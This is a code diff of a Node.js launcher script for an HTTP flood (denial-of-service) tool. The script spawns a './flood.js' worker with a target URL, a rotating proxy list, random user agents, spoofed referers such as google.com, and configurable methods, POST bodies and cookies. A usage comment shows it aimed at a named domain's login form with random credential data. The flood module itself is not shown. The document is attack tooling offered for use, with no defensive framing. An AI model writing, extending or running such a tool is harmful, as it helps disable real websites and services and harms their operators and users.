@@ -1,56 +1,41 @@
-const net = require('net'),
-events = require('events'),
-cluster = require('cluster'),
-fs = require('fs'),
-threads = process.argv[5];
-process.setMaxListeners(0); 
-events.EventEmitter.defaultMaxListeners = Infinity;
-events.EventEmitter.prototype._maxListeners = Infinity;
-var log = console.log;
+process.setMaxListeners(0);
+var postdata = process.argv[7];
+var refer = process.argv[10].replace(/~/g, '&');
+const fs = require("fs");
+const cluster = require('cluster');
+const {
+    Worker
+} = require('worker_threads');
+new Worker('./flood.js', {
+    workerData: {
+        target: process.argv[2].replace(/~/g, '&'),
+        proxies: [...new Set(fs.readFileSync(process.argv[5]).toString().match(/\S+/g))],
+        userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
+        referers: ["https://google.com", "https://youtube.com", "https://bing.com", "https://yahoo.com", "https://facebook.com", "https://gmail.com", "https://baidu.com", "https://qq.com", "https://reddit.com"],
+        duration: process.argv[3] * 1e3,
+        opt: {
+            method: process.argv[6] || "GET",
+            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
+            ratelimit: process.argv[8] == 'false' ? false : true,
+            cookie: process.argv[9] !== 'false' ? process.argv[9] : false,
+            refer: refer !== 'false' ? refer : ""
+        },
+        mode: process.argv[4]
+    }}).on('exit', code => {
+    if (code) {
+        switch (code) {
+            case '8':
+                //Target with too big body, blacklist the target.
 
-
-global.logger = function() { 
-    var first_parameter = arguments[0];
-    var other_parameters = Array.prototype.slice.call(arguments, 1);
-
-    function formatConsoleDate(date) {
-        var hour = date.getHours();
-        var minutes = date.getMinutes();
-        var seconds = date.getSeconds();
-        var milliseconds = date.getMilliseconds();
-
-        return '[' +
-            ((hour < 10) ? '0' + hour : hour) +
-            ':' +
-            ((minutes < 10) ? '0' + minutes : minutes) +
-            ':' +
-            ((seconds < 10) ? '0' + seconds : seconds) +
-            '.' +
-            ('00' + milliseconds).slice(-3) +
-            '] ';
+                break;
+        }
     }
+});
 
-    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
-};
+// node method.js https://exitus.xyz 300 request Checked.txt GET username=%RAND%@~
+//@password=%RAND% false
+//
 
-if (cluster.isMaster) {
-    let proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))],
-        dproxies = proxies;
-    proxies = [];
-
-    for (let i = 0; i < threads; i++) {
-        cluster.fork().setMaxListeners(0).send({
-            target: process.argv[2],
-            proxies: dproxies,
-            userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
-            referers: [],		
-            duration: process.argv[3] * 1e3 * threads,
-            opt: {
-                ratelimit: false
-            },
-            mode: process.argv[4]	    
-	});
-    }
-} else {
-    require('./flood');
-}
+setTimeout(() => {
+        process.exit(1)
+}, process.argv[3] * 1000)
